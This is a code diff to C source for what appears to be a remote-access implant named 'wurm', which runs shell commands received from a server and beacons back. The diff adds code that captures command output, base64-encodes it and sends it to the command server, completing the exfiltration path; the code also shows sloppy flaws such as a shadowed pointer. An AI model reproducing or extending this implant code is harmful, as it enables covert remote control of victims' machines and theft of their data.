@@ -7,6 +7,8 @@
 
 #define patch_length 2
 
+void Request(); // I need to develop actual header files just ignore this for now so that gcc can be quiet
+
 struct {
     struct {
         CHAR*   address;
@@ -67,7 +69,7 @@ BOOL AA$shell(CHAR* input, CHAR** output) {
         size += strlength; 
     }
 
-    printf("Out: %s", str);
+    *output = _strdup(str);
 
     pclose(out);
     return TRUE;
@@ -133,6 +135,7 @@ void Process(CHAR* command, CHAR* input) {
     // Set local variables
     CHAR* output = NULL;
     INT hex_command = atoi(command);
+    CHAR* data_pointer = NULL;
 
     printf("Processing command: %s\n", command);
     printf("Hex Value: 0x%x\n", hex_command);
@@ -144,6 +147,7 @@ void Process(CHAR* command, CHAR* input) {
             printf("Executing Command\n");
             if ((*patch_list_pointers[i])(input, &output)) {
                 printf("Output:%s\n", output);
+                goto send_output;
                 goto cleanup;
             }
         }
@@ -155,12 +159,39 @@ void Process(CHAR* command, CHAR* input) {
     strcat(command_input, input); 
     if ((*patch_list_pointers[0])(command_input, &output)) { // index 0 of patch list is shell function
         printf("Output:%s", output);
+        goto send_output;
         goto cleanup;
     }
+
+    // Format and encode output to be sent back to the server
+    send_output:
+        // Auth cookie can be added to the request if needed
+        if (output != NULL) {
+            // Set data allocation format
+            wurm.data.status = "output";
+            wurm.data.format = "%s:%s";
+
+            // Allocate memory to be encoded
+            DWORD pointer_length = strlen(wurm.data.format) + strlen(wurm.data.status) + strlen(output);
+            CHAR* data_pointer = malloc(pointer_length); // Must be freed
+            sprintf_s(data_pointer, pointer_length, wurm.data.format, wurm.data.status, output);
+
+            // Base-64 encode the allocated data structure 
+            DWORD data_length = strlen(wurm.data.status) + strlen(output) + 1; // Add null byte
+            Encode(data_pointer, data_length);
+
+            // Allocate buffer in data structure
+            CHAR* buffer = wurm.data.encode;
+            Package(buffer);
+
+            // Send request to server
+            Request();
+        }
 
     // Clean up memory
     goto cleanup;
     cleanup:
+        free(data_pointer);
         free(input);
         free(command_input);
         free(output);
@@ -177,6 +208,8 @@ void Request() {
     DWORD buffer_length = 0;
     DWORD available_size = 0;  
     DWORD dw_error = GetLastError();
+
+    printf("Current Status: %s\n", wurm.data.status);
 
     wurm.beacon.count += 1; // Note: move before process_cookie label once tested with new server refactor
 
